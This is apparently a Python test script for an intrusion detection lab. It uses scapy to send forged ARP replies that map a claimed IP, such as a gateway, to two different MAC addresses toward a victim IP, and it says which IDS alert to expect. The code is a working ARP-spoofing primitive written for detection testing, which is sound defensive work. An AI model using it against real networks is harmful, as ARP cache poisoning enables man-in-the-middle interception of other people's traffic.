#!/usr/bin/env python3
import argparse

from common import add_common_args, validate_lab_target, warn_if_not_root
from scapy.all import ARP, send


def main():
    parser = argparse.ArgumentParser(
        description="Generate ARP mapping-change packets for IDS ARP spoofing/MITM testing."
    )
    add_common_args(parser, target=False)
    parser.add_argument(
        "--claimed-ip",
        required=True,
        type=validate_lab_target,
        help="IP address whose MAC mapping will appear to change, such as the lab gateway IP.",
    )
    parser.add_argument(
        "--victim-ip",
        required=True,
        type=validate_lab_target,
        help="Private lab victim/target IP that receives the ARP replies.",
    )
    parser.add_argument(
        "--original-mac",
        default="aa:bb:cc:dd:ee:ff",
        help="First MAC address to advertise for the claimed IP.",
    )
    parser.add_argument(
        "--changed-mac",
        default="00:11:22:33:44:55",
        help="Second MAC address to advertise for the same claimed IP.",
    )
    parser.add_argument("--count", type=int, default=1, help="ARP replies per MAC mapping.")
    args = parser.parse_args()

    warn_if_not_root()

    print(
        f"Advertising {args.claimed_ip} as {args.original_mac}, "
        f"then {args.changed_mac}, toward {args.victim_ip}"
    )
    first = ARP(op=2, psrc=args.claimed_ip, hwsrc=args.original_mac, pdst=args.victim_ip)
    second = ARP(op=2, psrc=args.claimed_ip, hwsrc=args.changed_mac, pdst=args.victim_ip)
    send(first, count=args.count, verbose=False)
    send(second, count=args.count, verbose=False)
    print("Done. Expected IDS alert: ARP Spoofing / MITM Indicator.")


if __name__ == "__main__":
    main()
